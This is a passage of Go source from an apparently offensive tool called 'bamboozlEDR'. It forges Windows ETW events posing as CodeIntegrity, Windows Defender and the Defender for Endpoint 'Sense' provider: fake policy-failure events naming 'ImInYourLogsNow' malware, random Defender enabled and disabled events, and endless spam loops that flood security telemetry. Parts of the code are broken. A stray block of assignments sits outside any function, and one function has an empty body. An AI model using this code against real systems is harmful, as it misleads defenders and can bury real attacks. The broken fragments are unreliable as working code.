	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileNameLength))), Size: uint32(unsafe.Sizeof(fileNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileNameUTF16[0]))), Size: uint32(len(fileNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&secureRequired))), Size: uint32(unsafe.Sizeof(secureRequired))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&requestedSigningLevel))), Size: uint32(unsafe.Sizeof(requestedSigningLevel))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameLength))), Size: uint32(unsafe.Sizeof(processNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameUTF16[0]))), Size: uint32(len(processNameUTF16) * 2)},
	}

	log.Printf("fileName: %s\n", fileName)
	log.Printf("processName: %s\n", processName)
	log.Printf("secureRequired: 0x%x\n", secureRequired)
	log.Printf("requestedSigningLevel: %d\n", requestedSigningLevel)

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write CodeIntegrity event %d: %s", eventId, GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		log.Printf("CodeIntegrity Event %d written successfully.", eventId)
	}
}

	fileName := "C:\\Program Files\\ImInYourLogsNow\\suspicious.exe"
	processName := "lsass.exe"
	policyName := "DefaultPolicy"
	policyId := "{A244370E-44C9-4C06-B551-F6016E563076}"

}

// LogPolicyFailureEvent logs events 3076 and 3077 (both use same template)
func LogPolicyFailureEvent(regHandle syscall.Handle, eventId uint16, fileName, processName, policyName, policyId string, userWriteable bool) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16 // Operational channel
	eventDescriptor.Level = 2    // Warning
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000

	// Convert to UTF-16 and get proper lengths
	fileNameUTF16 := syscall.StringToUTF16(fileName)
	processNameUTF16 := syscall.StringToUTF16(processName)
	policyNameUTF16 := syscall.StringToUTF16(policyName)
	policyIdUTF16 := syscall.StringToUTF16(policyId)

	// Generate sample data
	fileNameLength := uint16(len(fileNameUTF16))
	processNameLength := uint16(len(processNameUTF16))
	requestedSigningLevel := uint8(8)
	validatedSigningLevel := uint8(0)
	status := uint32(0xC0000428) // STATUS_INVALID_IMAGE_HASH

	// Generate hashes
	sha1Hash := sha1.Sum([]byte(fileName))
	sha256Hash := sha256.Sum256([]byte(fileName))
	sha1FlatHash := sha1.Sum([]byte(fileName + "_flat"))
	sha256FlatHash := sha256.Sum256([]byte(fileName + "_flat"))

	sha1HashSize := uint32(len(sha1Hash))
	sha256HashSize := uint32(len(sha256Hash))
	sha1FlatHashSize := uint32(len(sha1FlatHash))
	sha256FlatHashSize := uint32(len(sha256FlatHash))

	usn := uint64(12345678)
	siSigningScenario := uint32(1)

	policyNameLength := uint16(len(policyNameUTF16))
	policyIdLength := uint16(len(policyIdUTF16))

	policyHash := generateRandomHash(32)
	policyHashSize := uint32(len(policyHash))

	originalFileName := "original_" + fileName
	originalFileNameUTF16 := syscall.StringToUTF16(originalFileName)
	originalFileNameLength := uint16(len(originalFileNameUTF16))

	internalName := "internal_name.exe"
	internalNameUTF16 := syscall.StringToUTF16(internalName)
	internalNameLength := uint16(len(internalNameUTF16))

	fileDescription := "Suspicious executable file"
	fileDescriptionUTF16 := syscall.StringToUTF16(fileDescription)
	fileDescriptionLength := uint16(len(fileDescriptionUTF16))

	productName := "Malware Product"
	productNameUTF16 := syscall.StringToUTF16(productName)
	productNameLength := uint16(len(productNameUTF16))

	fileVersion := "1.0.0.0"

	var policyGUID GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&policyGUID)))

	packageFamilyName := ""
	packageFamilyNameUTF16 := syscall.StringToUTF16(packageFamilyName)
	packageFamilyNameLength := uint16(len(packageFamilyNameUTF16))

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileNameLength))), Size: uint32(unsafe.Sizeof(fileNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileNameUTF16[0]))), Size: uint32(len(fileNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameLength))), Size: uint32(unsafe.Sizeof(processNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameUTF16[0]))), Size: uint32(len(processNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&requestedSigningLevel))), Size: uint32(unsafe.Sizeof(requestedSigningLevel))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&validatedSigningLevel))), Size: uint32(unsafe.Sizeof(validatedSigningLevel))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&status))), Size: uint32(unsafe.Sizeof(status))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1HashSize))), Size: uint32(unsafe.Sizeof(sha1HashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1Hash[0]))), Size: sha1HashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256HashSize))), Size: uint32(unsafe.Sizeof(sha256HashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256Hash[0]))), Size: sha256HashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1FlatHashSize))), Size: uint32(unsafe.Sizeof(sha1FlatHashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1FlatHash[0]))), Size: sha1FlatHashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256FlatHashSize))), Size: uint32(unsafe.Sizeof(sha256FlatHashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256FlatHash[0]))), Size: sha256FlatHashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&usn))), Size: uint32(unsafe.Sizeof(usn))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&siSigningScenario))), Size: uint32(unsafe.Sizeof(siSigningScenario))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameLength))), Size: uint32(unsafe.Sizeof(policyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameUTF16[0]))), Size: uint32(len(policyNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyIdLength))), Size: uint32(unsafe.Sizeof(policyIdLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyIdUTF16[0]))), Size: uint32(len(policyIdUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyHashSize))), Size: uint32(unsafe.Sizeof(policyHashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyHash[0]))), Size: policyHashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalFileNameLength))), Size: uint32(unsafe.Sizeof(originalFileNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalFileNameUTF16[0]))), Size: uint32(len(originalFileNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&internalNameLength))), Size: uint32(unsafe.Sizeof(internalNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&internalNameUTF16[0]))), Size: uint32(len(internalNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileDescriptionLength))), Size: uint32(unsafe.Sizeof(fileDescriptionLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileDescriptionUTF16[0]))), Size: uint32(len(fileDescriptionUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&productNameLength))), Size: uint32(unsafe.Sizeof(productNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&productNameUTF16[0]))), Size: uint32(len(productNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringBytePtr(fileVersion)))), Size: uint32(len(fileVersion) + 1)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyGUID))), Size: uint32(unsafe.Sizeof(policyGUID))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&userWriteable))), Size: uint32(unsafe.Sizeof(userWriteable))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageFamilyNameLength))), Size: uint32(unsafe.Sizeof(packageFamilyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageFamilyNameUTF16[0]))), Size: uint32(len(packageFamilyNameUTF16) * 2)},
	}

	log.Printf("fileName: %s", fileName)
	log.Printf("processName: %s", processName)
	log.Printf("policyName: %s", policyName)
	log.Printf("status: 0x%x", status)

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if statusResult != 0 {
		log.Printf("Failed to write CodeIntegrity event %d: %s", eventId, GetWindowsErrorDescription(uint32(statusResult)))
		return
	} else {
		log.Printf("CodeIntegrity Event %d written successfully.", eventId)
	}
}

// WriteInfiniteRandomCodeIntegrityEvents emits random CodeIntegrity events continuously
func WriteInfiniteRandomCodeIntegrityEvents() {
	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&CodeIntegrityProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register CodeIntegrity provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	eventIds := []uint16{3023, 3036, 3076, 3077}

	for {
		if IsEscapePressed() {
			break
		}

		activityId := GetNextGuid()
		procEventActivityId.Call(3, uintptr(unsafe.Pointer(activityId)))

		// Randomly select an event ID
		eventId := eventIds[count%len(eventIds)]

		var success bool
		switch eventId {
		case 3023, 3036:
			fileName := fmt.Sprintf("C:\\Windows\\System32\\ImInYourLogsNow_driver_%d.sys", count)
			processName := "svchost.exe"
			success = LogRevokedDriverEventQuiet(regHandle, eventId, fileName, processName, 0x12345678, 8)
		case 3076, 3077:
			fileName := fmt.Sprintf("C:\\Program Files\\App_%d\\ImInYourLogsNow.exe", count)
			processName := "ntoskrnl.exe"
			policyName := "DefaultPolicy"
			policyId := fmt.Sprintf("{A244370E-44C9-4C06-B551-F6016E56%04d}", count)
			success = LogPolicyFailureEventQuiet(regHandle, eventId, fileName, processName, policyName, policyId, count%2 == 0)

		}

		UpdateProviderStats("CodeIntegrity", success)
		count++
	}
}

// Quiet versions for TUI mode (no verbose logging)

// LogRevokedDriverEventQuiet is a quiet version of LogRevokedDriverEvent for TUI mode
func LogRevokedDriverEventQuiet(regHandle syscall.Handle, eventId uint16, fileName, processName string, secureRequired uint32, requestedSigningLevel uint8) bool {

}

// LogPolicyFailureEventQuiet is a quiet version of LogPolicyFailureEvent for TUI mode
func LogPolicyFailureEventQuiet(regHandle syscall.Handle, eventId uint16, fileName, processName, policyName, policyId string, userWriteable bool) bool {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 16
	eventDescriptor.Level = 2
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x8000000000000000

	// Convert to UTF-16 and get proper lengths
	fileNameUTF16 := syscall.StringToUTF16(fileName)
	processNameUTF16 := syscall.StringToUTF16(processName)
	policyNameUTF16 := syscall.StringToUTF16(policyName)
	policyIdUTF16 := syscall.StringToUTF16(policyId)

	fileNameLength := uint16(len(fileNameUTF16))
	processNameLength := uint16(len(processNameUTF16))
	requestedSigningLevel := uint8(8)
	validatedSigningLevel := uint8(0)
	status := uint32(0xC0000428)

	sha1Hash := sha1.Sum([]byte(fileName))
	sha256Hash := sha256.Sum256([]byte(fileName))
	sha1FlatHash := sha1.Sum([]byte(fileName + "_flat"))
	sha256FlatHash := sha256.Sum256([]byte(fileName + "_flat"))

	sha1HashSize := uint32(len(sha1Hash))
	sha256HashSize := uint32(len(sha256Hash))
	sha1FlatHashSize := uint32(len(sha1FlatHash))
	sha256FlatHashSize := uint32(len(sha256FlatHash))

	usn := uint64(12345678)
	siSigningScenario := uint32(1)

	policyNameLength := uint16(len(policyNameUTF16))
	policyIdLength := uint16(len(policyIdUTF16))

	policyHash := generateRandomHash(32)
	policyHashSize := uint32(len(policyHash))

	originalFileName := "original_" + fileName
	originalFileNameUTF16 := syscall.StringToUTF16(originalFileName)
	originalFileNameLength := uint16(len(originalFileNameUTF16))

	internalName := "internal_name.exe"
	internalNameUTF16 := syscall.StringToUTF16(internalName)
	internalNameLength := uint16(len(internalNameUTF16))

	fileDescription := "Suspicious executable file"
	fileDescriptionUTF16 := syscall.StringToUTF16(fileDescription)
	fileDescriptionLength := uint16(len(fileDescriptionUTF16))

	productName := "ImInYourLogsNow Malware Product"
	productNameUTF16 := syscall.StringToUTF16(productName)
	productNameLength := uint16(len(productNameUTF16))

	fileVersion := "1.0.0.0"

	var policyGUID GUID
	procCoCreateGuid.Call(uintptr(unsafe.Pointer(&policyGUID)))

	packageFamilyName := ""
	packageFamilyNameUTF16 := syscall.StringToUTF16(packageFamilyName)
	packageFamilyNameLength := uint16(len(packageFamilyNameUTF16))

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileNameLength))), Size: uint32(unsafe.Sizeof(fileNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileNameUTF16[0]))), Size: uint32(len(fileNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameLength))), Size: uint32(unsafe.Sizeof(processNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameUTF16[0]))), Size: uint32(len(processNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&requestedSigningLevel))), Size: uint32(unsafe.Sizeof(requestedSigningLevel))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&validatedSigningLevel))), Size: uint32(unsafe.Sizeof(validatedSigningLevel))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&status))), Size: uint32(unsafe.Sizeof(status))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1HashSize))), Size: uint32(unsafe.Sizeof(sha1HashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1Hash[0]))), Size: sha1HashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256HashSize))), Size: uint32(unsafe.Sizeof(sha256HashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256Hash[0]))), Size: sha256HashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1FlatHashSize))), Size: uint32(unsafe.Sizeof(sha1FlatHashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha1FlatHash[0]))), Size: sha1FlatHashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256FlatHashSize))), Size: uint32(unsafe.Sizeof(sha256FlatHashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&sha256FlatHash[0]))), Size: sha256FlatHashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&usn))), Size: uint32(unsafe.Sizeof(usn))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&siSigningScenario))), Size: uint32(unsafe.Sizeof(siSigningScenario))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameLength))), Size: uint32(unsafe.Sizeof(policyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyNameUTF16[0]))), Size: uint32(len(policyNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyIdLength))), Size: uint32(unsafe.Sizeof(policyIdLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyIdUTF16[0]))), Size: uint32(len(policyIdUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyHashSize))), Size: uint32(unsafe.Sizeof(policyHashSize))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyHash[0]))), Size: policyHashSize},
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalFileNameLength))), Size: uint32(unsafe.Sizeof(originalFileNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&originalFileNameUTF16[0]))), Size: uint32(len(originalFileNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&internalNameLength))), Size: uint32(unsafe.Sizeof(internalNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&internalNameUTF16[0]))), Size: uint32(len(internalNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileDescriptionLength))), Size: uint32(unsafe.Sizeof(fileDescriptionLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&fileDescriptionUTF16[0]))), Size: uint32(len(fileDescriptionUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&productNameLength))), Size: uint32(unsafe.Sizeof(productNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&productNameUTF16[0]))), Size: uint32(len(productNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringBytePtr(fileVersion)))), Size: uint32(len(fileVersion) + 1)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&policyGUID))), Size: uint32(unsafe.Sizeof(policyGUID))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&userWriteable))), Size: uint32(unsafe.Sizeof(userWriteable))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageFamilyNameLength))), Size: uint32(unsafe.Sizeof(packageFamilyNameLength))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&packageFamilyNameUTF16[0]))), Size: uint32(len(packageFamilyNameUTF16) * 2)},
	}

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	return statusResult == 0
}

```

`cmd/cyberevents.go`:

```go
package cmd

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"bamboozlEDR/internal"
)

type EventData struct {
	Data struct {
		Events            string `json:"events"`
		EventMetadata     string `json:"EventMetadata"`
		IsEventCompressed bool   `json:"IsEventCompressed"`
	} `json:"data"`
}

func WriteCyberEvent() error {
	fmt.Println("Emitting events into the tracesession (if you are running as SYSTEM)...")
	fmt.Println("This will take a while...")
	fmt.Println("The trace session is not used for anything, it's just for debugging...")
	fmt.Println("The events are not showing up in MDE, I kept the implementation for the sake of POC...")
	SequenceNumber := 49900

	jsonData, err := os.ReadFile("telemetry/sense-output.json")
	if err != nil {
		return fmt.Errorf("failed to read JSON file: %v", err)
	}

	jsonLines := strings.Split(string(jsonData), "\n")

	for _, line := range jsonLines {
		SequenceNumber++

		if strings.TrimSpace(line) == "" {
			continue
		}

		var eventData EventData
		err := json.Unmarshal([]byte(line), &eventData)
		if err != nil {
			fmt.Printf("Error parsing JSON line: %v\n", err)
			continue
		}

		var metadata struct {
			EventType  string `json:"EventType"`
			Consumers  int    `json:"Consumers"`
			Truncation int    `json:"Truncation"`
			RuleId     string `json:"RuleId"`
			UseCases   int    `json:"UseCases"`
		}

		err = json.Unmarshal([]byte(eventData.Data.EventMetadata), &metadata)
		if err != nil {
			fmt.Printf("Error parsing EventMetadata: %v\n", err)
			continue
		}

		err = internal.WriteETWEvent(
			"{cb2ff72d-d4e4-585d-33f9-f3a395c40be7}",
			"Microsoft.Windows.Sense.CyberEvents",
			eventData.Data.EventMetadata,
			eventData.Data.Events,
			SequenceNumber,
		)
		if err != nil {
			fmt.Printf("Failed to write cyber event: %v\n", err)
			continue
		}

		fmt.Printf("Emitted event with RuleId: %s\n", metadata.RuleId)
	}

	return nil
}

```

`cmd/defender.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"math/rand"
	"syscall"
	"unsafe"
)

var DefenderProviderGuid = GUID{0x11cd958a, 0xc507, 0x4ef3, [8]byte{0xb3, 0xf2, 0x5f, 0xd9, 0xdf, 0xbd, 0x2c, 0x78}}

func WriteDefenderEnabledEvent() {
	fmt.Println("Emitting Windows Defender enabled event...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DefenderProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register Windows Defender provider: %d", status)
	}

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}

	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	productName := "Microsoft Defender Antivirus"
	productVersion := "4.18.25050.5"

	LogDefenderEvent(regHandle, 5000, productName, productVersion, 0)

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteDefenderDisabledEvent() {
	fmt.Println("Emitting Windows Defender disabled event...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DefenderProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register Windows Defender provider: %d", status)
	}

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}

	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	productName := "Microsoft Defender Antivirus"
	productVersion := "4.18.25050.5"

	LogDefenderEvent(regHandle, 5001, productName, productVersion, 0)

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteSpamDefenderEvent() {
	log.Println("Emitting Windows Defender spam events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DefenderProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register Windows Defender provider: %d", status)
	}

	for i := 0; i < 25; i++ {
		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Fatalf("Failed to create GUID: %d", hr)
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		productName := "Microsoft Defender Antivirus"
		productVersion := randomDefenderVersion()

		// Randomly choose between enabled (5000) and disabled (5001)
		eventId := uint16(5000)
		if rand.Intn(2) == 1 {
			eventId = 5001
		}

		LogDefenderEvent(regHandle, eventId, productName, productVersion, i)
	}

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteInfiniteSpamDefenderEvent() {
	log.Println("Starting infinite Windows Defender events... Press ESC to stop")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&DefenderProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register Windows Defender provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	for {
		if IsEscapePressed() {
			log.Printf("Escape pressed. Sent %d Defender events.", count)
			break
		}

		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Printf("Failed to create GUID: %d, continuing...", hr)
			continue
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		productName := "Microsoft Defender Antivirus"
		productVersion := randomDefenderVersion()

		eventId := uint16(5000)
		if rand.Intn(2) == 1 {
			eventId = 5001
		}

		LogDefenderEvent(regHandle, eventId, productName, productVersion, count)

		count++
		if count%100 == 0 {
			log.Printf("Sent %d Defender events...", count)
		}
	}
}

func WriteDefenderMalwareDetectedEvent() {
	fmt.Println("Emitting Windows Defender malware detection and action events...")

	var regHandle syscall.Handle

	// Common event data for both 1116 and 1117

	unused := ""

	fmt.Println("Emitting Event ID 1116 - Malware Detected...")
```
